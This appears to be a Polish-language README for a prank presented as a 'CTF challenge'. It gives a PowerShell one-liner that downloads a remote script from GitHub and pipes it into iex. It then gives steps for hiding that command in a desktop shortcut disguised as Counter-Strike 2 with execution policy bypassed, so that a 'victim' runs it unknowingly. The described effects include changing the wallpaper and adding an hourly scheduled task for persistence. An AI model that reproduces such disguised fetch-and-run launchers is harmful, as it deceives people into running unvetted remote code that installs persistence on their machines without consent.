# CTF Challenge - Chaos Edition 🎮

## Jak uruchomić (jedną komendą PowerShell):

```powershell
irm https://raw.githubusercontent.com/santobinoofficial/images/main/ctf_challenge.ps1 | iex
```

## Jak stworzyć skrót na pulpicie wyglądający jak CS2:

1. Kliknij PPM na pulpicie → **Nowy → Skrót**
2. Lokalizacja:
   ```
   powershell.exe -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/santobinoofficial/images/main/ctf_challenge.ps1 | iex"
   ```
3. Nazwa: `Counter-Strike 2`
4. Kliknij PPM na skrócie → **Właściwości → Zmień ikonę**
5. Wklej ścieżkę do ikony CS2 (pobierz `.ico` z internetu)

## Co robi challenge:

| Co | Efekt |
|----|-------|
| 🖼️ Tapeta | Zmienia tapetę na Rick Astleya |
| ⏰ Scheduled Task | Co godzinę otwiera terminal z ASCII rickrollem |
| 💻 PS Prompt | Każdy terminal wyświetla "Never gonna give you up ~" |
| 🏳️ Flaga | Ukryta w rejestrze `HKCU:\Software\CTFChallenge` |

## Zadanie ofiary:

1. Znaleźć ukrytą flagę CTF
2. Wpisać komendę `Remove-CTFChallenge` która usuwa WSZYSTKO

## Usunięcie ręczne (jedną komendą):

```powershell
Remove-CTFChallenge
```
